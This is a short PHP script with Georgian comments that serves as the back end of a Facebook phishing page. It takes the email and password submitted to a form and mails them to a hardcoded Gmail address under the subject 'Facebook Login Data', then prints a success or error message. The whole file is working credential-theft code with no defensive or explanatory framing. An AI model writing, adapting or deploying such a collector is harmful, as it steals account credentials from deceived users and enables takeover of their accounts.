<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // მიიღეთ მომხმარებლის მონაცემები
    $email = $_POST['email'];
    $password = $_POST['password'];

    // იმეილზე გამოგზავნა
    $to = 'kobaxa166@gmail.com';  // შენი იმეილ
    $subject = 'Facebook Login Data';
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = 'From: no-reply@yourwebsite.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // იმეილ გაგზავნა
    if (mail($to, $subject, $message, $headers)) {
        echo 'მონაცემები წარმატებით გაიგზავნა!';
    } else {
        echo 'დაფიქსირდა შეცდომა და მონაცემები ვერ გაიგზავნა.';
    }
}
?>